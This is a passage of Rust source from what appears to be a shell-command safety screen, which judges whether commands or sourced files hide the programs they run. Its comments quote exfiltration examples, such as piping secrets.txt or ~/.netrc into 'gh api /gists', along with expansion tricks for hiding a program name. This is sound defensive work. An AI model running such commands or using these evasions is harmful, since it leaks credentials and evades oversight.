                joined.push(character);
            }
        }
    }
    if quote.is_some() {
        return text.to_owned();
    }
    joined
}

/// An interpreter word followed by a program file, after redirections are
/// blanked. `python3 -m` and `node -e` are not file launches.
pub(crate) fn unread_file_interpreter(shell: &str) -> bool {
    const FILE_INTERPRETERS: &[&str] = &[
        "sh", "bash", "dash", "zsh", "python", "python2", "python3", "node", "ruby", "perl", "php",
    ];
    without_redirections(shell)
        .split(|character: char| {
            matches!(
                character,
                ';' | '&' | '|' | '(' | ')' | '{' | '}' | '\n' | '`'
            )
        })
        .any(|piece| {
            let words: Vec<&str> = piece
                .split_whitespace()
                .map(|word| word.trim_matches(['\'', '"']))
                .filter(|word| !word.is_empty() && !is_assignment(word))
                .skip_while(|word| SHELL_PREFIXES.contains(word))
                .collect();
            let Some(program) = words.first() else {
                return false;
            };
            if !FILE_INTERPRETERS.contains(&command_basename(program).as_str()) {
                return false;
            }
            for argument in &words[1..] {
                if matches!(*argument, "-c" | "-m" | "-e") {
                    return false;
                }
                if argument.starts_with('-') {
                    continue;
                }
                return true;
            }
            false
        })
}

fn command_basename(word: &str) -> String {
    let base = word.rsplit(['/', '\\']).next().unwrap_or(word);
    base.strip_suffix(".exe")
        .unwrap_or(base)
        .to_ascii_lowercase()
}

/// Whether a sourced file's own words name every program it runs.
///
/// Reading a file bounds the owners only while its text is the whole story.
/// Text that builds a command word from an expansion or a glob, that sources
/// a further file this scan has not read, that hands text to an interpreter,
/// or that hides words behind an ANSI-C or locale quote can run a program
/// whose name never appears, so the command keeps the owners it had instead.
///
/// Comments and a function the file defines but nothing calls run nothing, so
/// neither is part of the story: `command` is read too, because sourcing the
/// file leaves its wrappers for the rest of the command to call.
pub(crate) fn bounds_its_owners(text: &str, command: &str) -> bool {
    if text.contains("$'") || text.contains("$\"") {
        return false;
    }
    // A comment runs nothing, and a script's prose is full of words that read
    // as commands: a sentence ending in a full stop put `.` in a command
    // position, which is the shell's other name for `source`.
    let literal = running_text(text, command);
    let masked = mask_double_quoted_separators(&literal);
    !synthesizes_program(&literal, false)
        && !runs_beside_its_command_words(&masked)
        && redirects_only_to_dev_null(&masked)
        && !command_words(&masked).any(|word| {
            let base = command_basename(&joined_quotes(word));
            INTERPRETERS.contains(&base.as_str())
        })
}

/// The parts of a sourced file that run, as one literal: its comments and the
/// definitions nothing calls taken out, its lookups read as the names they
/// print, and its `${NAME}` expansions read as the words they stand for.
fn running_text(text: &str, command: &str) -> String {
    let text = functions::without_comments(text).unwrap_or_else(|| text.to_owned());
    // `$(command -v cygpath)` prints a path and runs nothing, the same way it
    // does in the command itself, so the file keeps the name and loses the
    // substitution that otherwise read as a program built at run time.
    let text = without_lookups(&text);
    let plain = unquoted_literal(&text);
    // A parameter expansion in command position names the program it runs
    // only once the shell has expanded it, so a definition this scan would
    // read as dead may be exactly what `${f}` calls. Masking that expansion
    // into a plain word hides the call, so the definitions stay.
    let expands_a_command =
        command_words(&mask_double_quoted_words(&plain)).any(|word| word.starts_with('$'));
    let literal = mask_parameter_expansions(&plain);
    if expands_a_command {
        return literal;
    }
    functions::without_uncalled_definitions(&literal, command).unwrap_or(literal)
}

/// Whether the text runs a program somewhere other than a command word.
///
/// Two shapes do. `find . -exec "$CMD" {} \;` runs the program named by its
/// own argument, and only `find` ever reads as a command word, so the scan
/// above never sees it. A pipeline hands one program's bytes to another, and
/// the screen that names an exfiltration reads the command's own text, not a
/// file it sources: `cat secrets.txt | gh api ...` would otherwise read as a
/// plain set of settings, project its environment, and carry the file out
/// under the allow that `source ... && pytest` then earns.
///
/// `||` is not a pipe, and a generated activation script uses it to pick a
/// path. Neither shape appears in one of those scripts at all.
fn runs_beside_its_command_words(masked: &str) -> bool {
    let characters: Vec<char> = masked.chars().collect();
    let piped = characters.iter().enumerate().any(|(index, character)| {
        *character == '|'
            && characters.get(index + 1) != Some(&'|')
            && (index == 0 || characters[index - 1] != '|')
    });
    piped
        || masked.split_whitespace().any(|word| {
            matches!(
                joined_quotes(word).as_str(),
                "-exec" | "-execdir" | "-ok" | "-okdir"
            )
        })
}

/// Whether every redirection in a sourced file's text targets `/dev/null`.
///
/// A redirect carries bytes exactly as a pipe does, and the screen that names
/// an exfiltration reads the command's own text rather than a file it sources.
/// `gh api /gists --input - < ~/.netrc` names only one command word, so
/// without this an activation file holding it would project its environment
/// and hand the verdict to the `pytest` after it, which allows outright. A
/// tool handed the file as an argument redirects nothing; its name is a
/// command word, and the owner scan reads it there.
///
/// A generated activation script redirects only to discard a message, as
/// `hash -r 2> /dev/null` does, so holding every redirect to `/dev/null`
/// costs those scripts nothing. A descriptor copy such as `2>&1` or `>&2`
/// moves no file and stands.
fn redirects_only_to_dev_null(masked: &str) -> bool {
    let characters: Vec<char> = masked.chars().collect();
    let mut index = 0;
    while index < characters.len() {
        // A read is never a discard: `< file` feeds the file to the program.
        if characters[index] == '<' {
            return false;
        }
        if characters[index] != '>' {
            index += 1;
            continue;
        }
        let mut cursor = index + 1;
        if characters.get(cursor) == Some(&'>') {
            cursor += 1;
        }
        if characters.get(cursor) == Some(&'&')
            && characters
                .get(cursor + 1)
                .is_some_and(|next| next.is_ascii_digit() || *next == '-')
        {
            index = cursor + 2;
            continue;
        }
        let target: String = characters[cursor..]
            .iter()
            .skip_while(|character| matches!(**character, ' ' | '\t'))
            .take_while(|character| {
                !character.is_whitespace() && !matches!(**character, ';' | '&' | '|' | ')')
            })
            .collect();
        if target != "/dev/null" {
            return false;
        }
        index = cursor + 1;
    }
    true
}

/// The text with `${NAME}` parameter expansions replaced by a plain word.
///
/// The shell expands those to a value rather than running them, and a script
/// is full of them: `${BASH_SOURCE[0]:-$0}` inside a command substitution
/// would otherwise read as a command word built from an expansion. Bash's
/// `${ cmd; }` and `${| cmd; }` do run the commands they hold, so a brace
/// followed by a space or a pipe is left exactly as it stands, and `$(...)`
/// and backticks are never touched. A `${...}` whose body holds `$(...)` or
/// a backtick still runs that command, so the whole expansion is left in
/// place rather than hidden behind a plain word.
fn mask_parameter_expansions(literal: &str) -> String {
    let characters: Vec<char> = literal.chars().collect();
    let mut out = String::with_capacity(literal.len());
    let mut index = 0;
    while index < characters.len() {
        let expansion = characters[index] == '$'
            && characters.get(index + 1) == Some(&'{')
            && !matches!(
                characters.get(index + 2),
                Some(' ' | '\t' | '\n' | '|') | None
            );
        if !expansion || parameter_expansion_runs_a_command(&characters[index..]) {
            out.push(characters[index]);
            index += 1;
            continue;
        }
        out.push('x');
        index += 2;
        let mut depth = 1usize;
        while index < characters.len() && depth > 0 {
            match characters[index] {
                '{' => depth += 1,
                '}' => depth -= 1,
                _ => {}
            }
            index += 1;
        }
    }
    out
}

/// Bash runs a command substitution nested in a default value, as in
/// `${UNSET:-$(tool)}`. Masking the whole `${...}` would hide that program.
fn parameter_expansion_runs_a_command(characters: &[char]) -> bool {
    let mut depth = 1usize;
    let mut index = 2;
    while index < characters.len() && depth > 0 {
        if characters[index] == '`'
            || (characters[index] == '$' && characters.get(index + 1) == Some(&'('))
        {
            return true;
        }
        match characters[index] {
            '{' => depth += 1,
            '}' => depth -= 1,
            _ => {}
        }
        index += 1;
    }
    false
}

/// An expansion glued to the characters beside it spells a word the text does
/// not hold. `find . -exec ${X}er ps {} +` runs docker when `X` is `dock`, and
/// nothing a floor can read names it, so a command carrying one keeps its
/// evaluation failure. An expansion standing as its own word, or beside a
/// separator such as `/` or `=`, names no program the text is hiding.
fn expansion_builds_a_word(text: &str) -> bool {
    let characters: Vec<char> = text.chars().collect();
    for (at, _) in text.match_indices("${") {
        let start = text[..at].chars().count();
        if start > 0 && glues_a_word(characters[start - 1]) {
            return true;
        }
        let Some(close) = characters[start..]
            .iter()
            .position(|character| *character == '}')
        else {
            return true;
        };
        if characters
            .get(start + close + 1)
            .copied()
            .is_some_and(glues_a_word)
        {
            return true;
        }
    }
    false
}

/// A character the shell joins to the expansion beside it. Quotes and a
/// backslash join too: `"dock"${X}`, `${X}"er"` and `${X}\er` are each one
/// word, so the program they name is not in the text either.
fn glues_a_word(character: char) -> bool {
    character.is_alphanumeric()
        || matches!(character, '_' | '-' | '.' | '$' | '}' | '"' | '\'' | '\\')
}

fn synthesizes_program(literal: &str, sourced: bool) -> bool {
    let masked = mask_double_quoted_separators(&without_case_labels(literal));
    let mut words = command_words(&masked).filter(|word| !is_assignment(word));
    words.any(|word| {
        !matches!(
            word,
            "for" | "case" | "select" | "in" | "done" | "fi" | "esac" | "[" | "[["
        ) && ((word == "." && !sourced) || word.contains(['$', '*', '?', '[']))
    })
}

/// The text with command separators inside double quotes made ordinary, so a
/// quoted regex such as `"^@@|^[+-]"` stays one argument instead of starting
/// a fake command word. Expansion characters stay in place, so `"$cmd"` in a
/// command position is still seen, and a quoted span holding a command
/// substitution is left untouched because its commands still run. That
/// includes `$(...)`, backticks, and Bash's `${ cmd; }` / `${| cmd; }` form.
fn mask_double_quoted_separators(literal: &str) -> String {
    mask_double_quoted(literal, false)
}

/// The text with every double-quoted span reduced to one word: the separators
/// `mask_double_quoted_separators` masks, and its spaces too.
///
/// The shell splits no words inside double quotes, so `PS1="(${NAME}) ${PS1-}"`
/// is a single assignment. Splitting it on the space reads `${PS1-}` as a word
/// in command position, which is how an ordinary activation script looked like
/// a file that builds a command name at run time.
fn mask_double_quoted_words(literal: &str) -> String {
    mask_double_quoted(literal, true)
}

fn mask_double_quoted(literal: &str, words: bool) -> String {
    let mut out = String::with_capacity(literal.len());
    let mut span: Option<String> = None;
    let mut escaped = false;
    for character in literal.chars() {
        let Some(quoted) = span.as_mut() else {
            out.push(character);
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == '"' {
                span = Some(String::new());
            }
            continue;
        };
        if escaped {
            escaped = false;
        } else if character == '\\' {
            escaped = true;
        } else if character == '"' {
            out.push_str(&mask_span(quoted, words));
            out.push(character);
            span = None;
            continue;
        }
        quoted.push(character);
    }
    if let Some(quoted) = span {
        out.push_str(&quoted);
    }
    out
}

fn span_runs_a_command(quoted: &str) -> bool {
    quoted.contains("$(")
        || quoted.contains('`')
        || crate::parser_brace_command::brace_runs_a_command(quoted)
}

fn mask_span(quoted: &str, words: bool) -> String {
    if span_runs_a_command(quoted) {
        return quoted.to_owned();
    }
    quoted
        .chars()
        .map(|character| match character {
            ';' | '&' | '|' | '(' | ')' | '{' | '}' | '\n' => 'x',
            ' ' | '\t' if words => 'x',
            other => other,
        })
        .collect()
}

/// The leading assignments and first word of each simple command, after
/// any shell keyword that takes a command position.
fn command_words(literal: &str) -> impl Iterator<Item = &str> {
    literal
        .split(|character: char| {
            matches!(
                character,
                ';' | '&' | '|' | '(' | ')' | '{' | '}' | '\n' | '`'
            )
        })
        .flat_map(|piece| {
            let words = piece
                .split_whitespace()
                .skip_while(|word| SHELL_PREFIXES.contains(word));
            let mut leading = Vec::new();
            for word in words {
                leading.push(word);
                if !is_assignment(word) {
                    break;
                }
            }
            leading
        })
}

/// `server=$!`: the process ID of the job just backgrounded, saved so a later
/// `kill $server` stops it. A number moves no data, unless the name is one the
/// shell or loader reads.
fn saves_job_pid(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, value)| {
        value == "$!"
            && !matches!(
                name,
                "PATH" | "IFS" | "HOME" | "CDPATH" | "ENV" | "BASH_ENV" | "PS4" | "PROMPT_COMMAND"
            )
            && !name.starts_with("LD_")
            && !name.starts_with("DYLD_")
    })
}

/// `IFS= read -r line`: an assignment that names a value of nothing at all.
/// The shell sets the name to the empty string, so no text arrives through it
/// and nothing the command does not already show can be carried by it. The
/// canonical line reader is spelled this way, and reading the prefix as data
/// movement left `while IFS= read -r line; do ...; done < list.txt` blocked
/// outright with no approval left to give it, while the same loop without the
/// prefix reached review. A name the shell or loader itself reads keeps its
/// signal: emptying `PATH` is a change of its own, and so is emptying a name
/// that decides which files a pattern reaches or which options the shell runs
/// under. `GLOBIGNORE` is read as glob-changing wherever it is set, so an
/// empty one has to keep the same signal here rather than slipping past as a
/// prefix that carries nothing.
fn assigns_nothing(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, value)| {
        matches!(value, "" | "''" | "\"\"")
            && !matches!(
                name,
                "PATH"
                    | "HOME"
                    | "CDPATH"
                    | "ENV"
                    | "BASH_ENV"
                    | "PS4"
                    | "PROMPT_COMMAND"
                    | "GLOBIGNORE"
                    | "SHELLOPTS"
                    | "BASHOPTS"
            )
            && !name.starts_with("LD_")
            && !name.starts_with("DYLD_")
    })
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

#[path = "native_command_unmodeled_prefix.rs"]
mod prefix;

#[cfg(test)]
#[path = "native_command_unmodeled_tests.rs"]
mod tests;

#[cfg(test)]
#[path = "native_command_unmodeled_sourced_tests.rs"]
mod sourced_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_bounded_tests.rs"]
mod bounded_tests;

// A Windows shell keeps an unquoted backslash literal, so the evaluator refuses
// `$'…'` there rather than read it a second way; these vectors are POSIX-only.
#[cfg(all(test, not(windows)))]
#[path = "native_command_unmodeled_ansi_c_tests.rs"]
mod ansi_c_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_funsub_tests.rs"]
mod funsub_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_prefix_tests.rs"]
mod prefix_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_expansion_tests.rs"]
mod expansion_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_tree_group_tests.rs"]
mod tree_group_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_quoted_angle_tests.rs"]
mod quoted_angle_tests;

#[cfg(test)]
#[path = "native_command_unmodeled_substitution_tests.rs"]
mod substitution_tests;
